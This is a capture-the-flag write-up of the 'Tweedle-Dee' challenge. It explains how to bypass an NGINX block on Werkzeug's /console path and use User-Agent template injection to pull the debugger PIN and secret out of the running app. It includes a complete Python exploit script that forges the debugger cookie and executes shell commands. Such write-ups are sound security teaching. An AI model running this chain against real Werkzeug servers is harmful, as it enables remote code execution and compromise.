Tweedle-Dee CTF Challenge: Comprehensive Writeup

1. Introduction and Architecture Overview

Tweedle-Dee is a sequel to the Tweedle-Dum challenge. While the core vulnerability (Server-Side Template Injection via User-Agent) remains similar, the environment has been hardened significantly.

We are provided with the source code and a Docker environment. The architecture consists of two main components:

The Application: A Flask web app running behind the Werkzeug WSGI server (port 5000).

The Proxy: An NGINX server (port 2201) acting as a reverse proxy and security gatekeeper.

The goal remains the same as the previous iteration: Achieve Remote Code Execution (RCE) by exploiting the Werkzeug Debugger, which is enabled but seemingly inaccessible.

2. Reconnaissance: The NGINX Barrier

The most immediate change in this challenge is the NGINX configuration (nginx.conf). It implements strict access controls that prevent the trivial exploitation methods used previously.

The Configuration Analysis

Let's look at the critical sections of nginx.conf:

server {
    listen 2201;
    server_name _;

    # Restriction 1: Explicit blocking of the console endpoint
    location /console {
        return 403 "Bye";
    }

    # Restriction 2: Suppression of Stack Traces
    location @error {
        return 500 "Bye";
    }

    # Main Proxy Logic
    location / {
        error_page 500 503 @error;
        proxy_intercept_errors on;
        proxy_pass http://app:5000;
    }
}


The Implications

Blocked Access: If we try to navigate to http://target:2201/console, NGINX intercepts the request and immediately returns a 403 Forbidden.

Hidden Information: In the previous challenge, triggering a syntax error would reveal a Python stack trace containing vital debugging information (like the PIN or internal paths). Here, proxy_intercept_errors on ensures that any 500 Internal Server Error generated by Flask is replaced by a generic "Bye" message defined in @error.

3. Vulnerability Analysis: Bypassing NGINX

The "Path" Misconception

A common misconception is that the Werkzeug Debugger is strictly bound to the /console URL path. By analyzing the Werkzeug source code (specifically the DebuggedApplication middleware), we discover how it actually intercepts requests.

The debugger checks for specific query parameters in the __call__ method before the request is routed to a specific view function. Crucially, the debugger logic triggers if the parameter __debugger__=yes is present, regardless of the URL path.

The Bypass Strategy

Since NGINX only blocks the literal path /console, we can bypass this restriction by sending our debugger commands to the root path / (or any allowed path) while appending the debugger parameters.

For example, instead of:
GET /console?__debugger__=yes&cmd=... (Blocked 403)

We use:
GET /?__debugger__=yes&cmd=... (Allowed 200)

4. The Authentication Hurdle

Even though we can now talk to the debugger, we cannot execute code yet. The debugger is PIN-protected. When we attempt to execute a command, the server checks for a valid authentication cookie.

The PIN Logic

The source code reveals how the authentication cookie is generated. It is a hash based on the server's PIN, a salt, and the current timestamp.

# From the source code provided
def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

# The cookie value format
cookie_value = f"{int(time.time())}|{hash_pin(pin)}"


To forge this cookie and authenticate as an administrator, we need four specific pieces of information that reside in the application's memory:

The PIN: The auto-generated debugger PIN.

The Secret: A random 20-character string generated at startup (self.secret).

A Frame ID (frm): The ID of an active stack frame to execute code within.

The Cookie Name: The random name of the session cookie (e.g., __wzd...).

5. Exploitation: Deep Memory Inspection

We cannot guess these values. We must steal them.
We rely on the Server-Side Template Injection (SSTI) vulnerability in the User-Agent header (inherited from the previous challenge).

However, the variables we need (pin, secret) are attributes of the DebuggedApplication instance, not global variables. We need a way to traverse from the template context to the application instance.

The Threading Vector

Flask (via Werkzeug) handles requests using threads. The main server loop runs on a specific thread that loops forever (serve_forever).

We can use Python's introspection capabilities to:

Access the sys module.

Access the threading module.

Inspect the _active dictionary, which contains all running threads.

Find the specific thread running the server.

Extract the application object attached to that thread.

The Traversal Path

The traversal logic looks like this:

Entry Point: ua.__class__.__init__.__globals__ (Access global scope).

Modules: [t].sys.modules (Access imported modules).

Threading: ['threading'] (Access the threading module).

Active Threads: ._active (Dictionary of {thread_id: thread_object}).

Target Thread: [id]._target (The function the thread is running).

Application: .__self__.app (The DebuggedApplication instance).

Automating the Extraction

We cannot know the Thread ID in advance (it changes every restart). Therefore, our exploit script must be dynamic:

Step 1: Dump the _active dictionary string using SSTI.

Step 2: Parse the output to find the Thread ID associated with serve_forever.

Step 3: Use that ID to construct a new SSTI payload that extracts the specific attributes (pin, secret, frames, pin_cookie_name).

6. The Final Exploit Script

Below is the condensed Python script that automates the entire attack chain.

import requests, re, html, hashlib, time

URL = '[https://tweedle-dee.france-cybersecurity-challenge.fr](https://tweedle-dee.france-cybersecurity-challenge.fr)'

def ssti(payload):
    # Inject payload into User-Agent and return the rendered text found in the response
    res = requests.get(URL, headers={"User-Agent": payload}).text
    return html.unescape(re.findall(r'Hello (.*?)</div>', res)[0])

# 1. Locate the Thread ID for 'serve_forever'
print("[*] Enumerating threads...")
threads = ssti(r'{ua.__class__.__init__.__globals__[t].sys.modules[threading]._active}')
t_id = re.search(r'(\d+): <.*?serve_forever', threads).group(1)

# 2. Extract Secrets from the DebuggedApplication instance
print(f"[*] Found Thread ID: {t_id}. Extracting secrets...")
base = f'ua.__class__.__init__.__globals__[t].sys.modules[threading]._active[{t_id}]._target.__self__.app'
pin = ssti(f'{{{base}.pin}}')
secret = ssti(f'{{{base}.secret}}')
cookie_name = ssti(f'{{{base}.pin_cookie_name}}')
# Get the first valid Frame ID
frame_id = re.search(r'(\d+)', ssti(f'{{{base}.frames}}')).group(1)

# 3. Forge Cookie and Execute RCE
print(f"[*] PIN: {pin} | Secret: {secret} | Frame: {frame_id}")
cookie_val = f"{int(time.time())}|{hashlib.sha1(f'{pin} added salt'.encode('utf-8', 'replace')).hexdigest()[:12]}"

print("[*] Sending Payload...")
res = requests.get(URL, cookies={cookie_name: cookie_val}, params={
    "__debugger__": "yes", 
    "cmd": "__import__('os').popen('cat flag*').read()", 
    "frm": frame_id, 
    "s": secret
})

print(f"--- OUTPUT ---\n{res.text}")


7. Conclusion

This challenge demonstrates that blocking specific URL paths (like /console) via a reverse proxy is insufficient if the underlying application (Werkzeug) processes request parameters globally. Furthermore, it highlights the immense power of Server-Side Template Injection; even without direct variable access, Python's introspection features (sys, threading) allow attackers to traverse memory and extract sensitive internal state.

Flag: FCSC{2c149fdce9b3db514fa6adf094121999fea5c38fbb3370350d90925238499cf2}